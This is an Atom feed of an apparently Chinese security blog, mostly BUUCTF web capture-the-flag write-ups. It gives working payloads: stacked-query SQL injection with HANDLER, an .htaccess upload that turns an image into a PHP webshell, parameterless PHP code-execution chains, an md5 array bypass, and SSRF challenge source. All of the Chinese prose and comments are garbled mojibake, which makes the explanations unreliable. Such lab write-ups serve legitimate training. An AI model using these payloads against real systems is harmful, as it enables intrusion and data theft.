<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Damya&#39;s Blog</title>
  
  <subtitle>ã‚ã‚„ã‚„ã“ã‚„ã‚„</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.damyahome.github.io/"/>
  <updated>2020-10-11T11:06:07.462Z</updated>
  <id>https://www.damyahome.github.io/</id>
  
  <author>
    <name>Damya</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>10.8 é˜Ÿå†…AWDå°ç»“</title>
    <link href="https://www.damyahome.github.io/10-8-%E9%98%9F%E5%86%85AWD%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.damyahome.github.io/10-8-%E9%98%9F%E5%86%85AWD%E5%B0%8F%E7%BB%93/</id>
    <published>2020-10-11T11:00:52.000Z</published>
    <updated>2020-10-11T11:06:07.462Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸å®‰å…¨çš„å†…å®¹å°±ç®—å¯¼å‡ºmdä¹Ÿæ˜¯ä¸å®‰å…¨,ç«ç»’çœŸä¸¥æ ¼,pdfçœŸé¦™</p><p>pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ<br><div class="row">    <embed src="10_8_é˜Ÿå†…AWDå°ç»“.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¸å®‰å…¨çš„å†…å®¹å°±ç®—å¯¼å‡ºmdä¹Ÿæ˜¯ä¸å®‰å…¨,ç«ç»’çœŸä¸¥æ ¼,pdfçœŸé¦™&lt;/p&gt;
&lt;p&gt;pdfæ’ä»¶åŠ è½½æ¯”è¾ƒæ…¢,è¯·ç¨ç­‰ä¸€ä¸‹ä¸‹å“ˆ&lt;br&gt;

	&lt;div class=&quot;row&quot;&gt;
    &lt;embed src=&quot;10_8_é˜Ÿå†…AWDå°ç»“.pdf&quot; width=&quot;100%&quot; height=&quot;55
      
    
    </summary>
    
    
      <category term="AWD" scheme="https://www.damyahome.github.io/categories/AWD/"/>
    
    
      <category term="é¶åœºç»ƒä¹ " scheme="https://www.damyahome.github.io/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF webç»ƒä¹ 5</title>
    <link href="https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A05/"/>
    <id>https://www.damyahome.github.io/BUUCTF-web%E7%BB%83%E4%B9%A05/</id>
    <published>2020-10-07T13:12:09.000Z</published>
    <updated>2020-10-07T13:20:27.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><a href="http://202bc5e9-02e8-4c36-9793-151b247a806c.node3.buuoj.cn" target="_blank" rel="noopener">http://202bc5e9-02e8-4c36-9793-151b247a806c.node3.buuoj.cn</a></p><p>ç»æµ‹è¯•æ˜¯å­—ç¬¦å‹æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./1.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>å°è¯•è”åˆæŸ¥è¯¢,çˆ†å‡ºäº†é»‘åå•,å…ˆç”¨showæŸ¥ç€</p><figure class="image-box">                <img src="./2.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>æ ¹æ®åŒ¹é…,å…ˆé—­åˆè¯­å¥å†è¿›è¡ŒæŸ¥è¯¢<br><figure class="image-box">                <img src="./3.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show databases;#</span><br><span class="line">?inject=1&apos;;show tables;#</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./4.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>çœ‹åˆ°æ˜æ˜¾çš„FlagHereè¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;show tables;show columns from FlagHere;show columns from words;#</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./5.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>åœ¨mysqlé‡Œè¿˜èƒ½ä½¿ç”¨handlerè¿›è¡ŒæŸ¥è¯¢,å…·ä½“ä½¿ç”¨<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a></p><p>handlerâ€¦openè¯­å¥å°†æ‰“å¼€ä¸€ä¸ªè¡¨,ä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­handlerâ€¦readè¯­å¥è¿›è¡Œè®¿é—®,è¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«,å¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨handlerâ€¦closeæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&apos;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./6.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{901a13f0-67cb-4dd5-b765-0d2c02c91e81}</p><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p><a href="http://5f42ce42-df7b-494b-bf63-bab03cd0f852.node3.buuoj.cn" target="_blank" rel="noopener">http://5f42ce42-df7b-494b-bf63-bab03cd0f852.node3.buuoj.cn</a></p><figure class="image-box">                <img src="./7.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>è¿‡æ»¤å¾—å¾ˆä¸¥,åªèƒ½ä¸Šä¼ å›¾ç‰‡,ä½†.htaccessä¹Ÿå¯ä»¥ä¸Šä¼ </p><p>ä¼ å…¥.htaccessæ–‡ä»¶ä½œä¸ºphpè§£æå™¨,ä½¿æˆ‘ä»¬ä¼ å…¥çš„å›¾ç‰‡é©¬é‡ŒåŒ…å«çš„phpè¯­å¥ç”Ÿæ•ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./8.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><figure class="image-box">                <img src="./9.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>åœ¨ç”¨èšå‰‘è¿æ¥æ—¶è¿æ¥å›¾ç‰‡åœ°å€</p><figure class="image-box">                <img src="./10.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>è¿›åˆ°æ ¹ç›®å½•è·å¾—flag</p><figure class="image-box">                <img src="./11.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{29c63dce-7ee9-4f02-a809-c41bf114cd19}</p><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p><a href="http://b8053621-499f-4613-8852-d66828da67fe.node3.buuoj.cn" target="_blank" rel="noopener">http://b8053621-499f-4613-8852-d66828da67fe.node3.buuoj.cn</a></p><p>å…ˆdirmapæ‰«ä¸ªç›®å½•</p><figure class="image-box">                <img src="./12.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>çœ‹åˆ°æœ‰.gitéšè—æ–‡ä»¶,ç”¨githackæ¢å¤</p><figure class="image-box">                <img src="./13.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">Â  Â  <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//è¿‡æ»¤ä¼ªåè®®</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//æ­£åˆ™åŒ¹é…,ä¼ å‚ä¼šè¢«æ›¿æ¢æˆNULLä¸”è¯­å¥çš„åˆæ³•å½¢å¼æ˜¯a(b());</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line"><span class="comment">//è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">else</span>&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  <span class="keyword">die</span>(<span class="string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);</span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">else</span>&#123;</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="keyword">die</span>(<span class="string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);</span><br><span class="line">Â  Â  Â  Â  &#125;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">else</span>&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">die</span>(<span class="string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•ä¸€-åˆ©ç”¨å¸¸é‡å‡½æ•°"><a href="#æ–¹æ³•ä¸€-åˆ©ç”¨å¸¸é‡å‡½æ•°" class="headerlink" title="æ–¹æ³•ä¸€:åˆ©ç”¨å¸¸é‡å‡½æ•°"></a>æ–¹æ³•ä¸€:åˆ©ç”¨å¸¸é‡å‡½æ•°</h3><p>æ— å‚RCEéœ€è¦ä¸€äº›phpè‡ªå¸¦å¸¸é‡çš„å‡½æ•°æ¥æ„é€ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir()) //é¦–å…ˆæƒ³åˆ°çš„æ˜¯è¾“å‡ºç›®å½•,å¦‚ä½•æŒ‡å®šå½“å‰ç›®å½•?</span><br><span class="line">?exp=print_r(scandir(current(localeconv()))) //current(localeconv())ç»“åˆ,è¾“å‡ºæœ¬åœ°æ•°ç»„çš„å€¼</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./14.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>phpé‡Œæœ‰ä¸ªnext()å‡½æ•°å¯ä»¥ç”¨æ¥è¯»å–æ•°ç»„çš„ä¸‹ä¸€ä½å…ƒç´ ,ä½†åœ¨è¿™é¢˜ä¸­ä¸èƒ½è¿ç»­ä½¿ç”¨,å› ä¸ºä¸é€‚ç”¨a(b())æ ¼å¼,å¯flag.phpæ­£å·§åœ¨å€’æ•°ç¬¬äºŒä½,æ‰€ä»¥å¯ä»¥å…ˆç”¨array_reverse()å°†æ•°ç»„å€’åºå†è¿›è¡Œè¯»å–,æ ¹æ®ä»£ç æ³¨é‡Šé‡‡ç”¨highlight_file()è¿›è¡Œè¾“å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./15.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{16bab8e9-4333-4ff6-9ca3-ef4b717467ad}</p><h3 id="æ–¹æ³•äºŒ-åˆ©ç”¨session"><a href="#æ–¹æ³•äºŒ-åˆ©ç”¨session" class="headerlink" title="æ–¹æ³•äºŒ:åˆ©ç”¨session"></a>æ–¹æ³•äºŒ:åˆ©ç”¨session</h3><p>è¿™æ˜¯çœ‹å¤§ä½¬åšå®¢å‘ç°çš„æ–¹æ³•,payloadå¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>é¦–å…ˆéœ€è¦ç†è§£sessionçš„å·¥ä½œåŸç†</p><ol><li>é¦–å…ˆä½¿ç”¨session_start()å‡½æ•°è¿›è¡Œåˆå§‹åŒ–</li><li>å½“æ‰§è¡ŒPHPè„šæœ¬æ—¶ï¼Œé€šè¿‡ä½¿ç”¨$_SESSIONè¶…å…¨å±€å˜é‡æ³¨å†Œsessionå˜é‡</li><li>å½“PHPè„šæœ¬æ‰§è¡Œç»“æŸæ—¶ï¼Œæœªè¢«é”€æ¯çš„sessionå˜é‡ä¼šè¢«è‡ªåŠ¨ä¿å­˜åœ¨æœ¬åœ°ä¸€å®šè·¯å¾„ä¸‹çš„sessionåº“ä¸­ï¼Œè¿™ä¸ªè·¯å¾„å¯ä»¥é€šè¿‡php.iniæ–‡ä»¶ä¸­çš„session.save_pathæŒ‡å®šï¼Œä¸‹æ¬¡æµè§ˆç½‘é¡µæ—¶å¯ä»¥åŠ è½½ä½¿ç”¨</li></ol><p>è€Œsession_start()åˆå§‹åŒ–çš„ä¸œè¥¿å¯ä»¥åœ¨cookieé‡Œä½¿ç”¨é»˜è®¤å€¼PHPSESSIDæˆ–è€…php.iniä¸­è®¾å®šçš„session.nameè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œå¦‚æœè¯»å–åˆ°äº†è¿™ä¸ªcookieå°†ä¼šåˆ›å»º$_SESSIONå˜é‡å¹¶ä»ç›¸åº”ç›®å½•ä¸­è¯»å–æ–‡ä»¶ï¼Œå¹¶å°†å­—ç¬¦è£…å…¥å˜é‡ä¸­ï¼›å¦‚æœæ²¡è¯»å–åˆ°ä¹Ÿä¼šåˆ›å»º$_SESSIONå˜é‡å’Œsessionæ–‡ä»¶å¹¶è¿”å›å€¼ã€‚</p><p>è·å–åˆ°session_start()çš„åˆå§‹å€¼åï¼Œsession_id()å¯ä»¥ç”¨æ¥è·å–sessionä¼šè¯çš„idï¼Œåœ¨cookieé‡ŒæŒ‡å®šåˆ°flag.phpåè¿›è¡Œè¯»å–ï¼Œå†ç”¨show_source()è¿›è¡Œè¾“å‡ºã€‚</p><figure class="image-box">                <img src="./16.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><a href="http://a8085622-bd11-414f-9ac0-6bebed5d4231.node3.buuoj.cn" target="_blank" rel="noopener">http://a8085622-bd11-414f-9ac0-6bebed5d4231.node3.buuoj.cn</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line"><span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>ä¸»è¦è¿›è¡Œäº†GETæ–¹é¢$ggå’Œ$idçš„md5åˆ¤æ–­,å’ŒPOSTæ–¹é¢çš„$passwdå¯†ç ä¼ å‚<br>ç›´æ¥æ•°ç»„ç»•è¿‡md5åˆ¤æ–­,æ•°å­—åŠ å­—æ¯ç»•è¿‡å¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?gg[]=a&amp;id[]=b</span><br><span class="line">passwd=1234567a</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="./17.png" alt="å›¾ç‰‡" title class>                <p>å›¾ç‰‡</p>            </figure><p>flag{9cada024-2b17-4a01-ad45-23871db3d3c9}</p><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p><a href="http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn" target="_blank" rel="noopener">http://e695ad48-e686-4361-a809-93147a6a1133.node3.buuoj.cn</a></p><p>å°†ä»£ç è¿›è¡Œæ’ç‰ˆ,æ˜¯ä¸ªflaskçš„æ¡†æ¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          </span><br><span class="line">        <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span 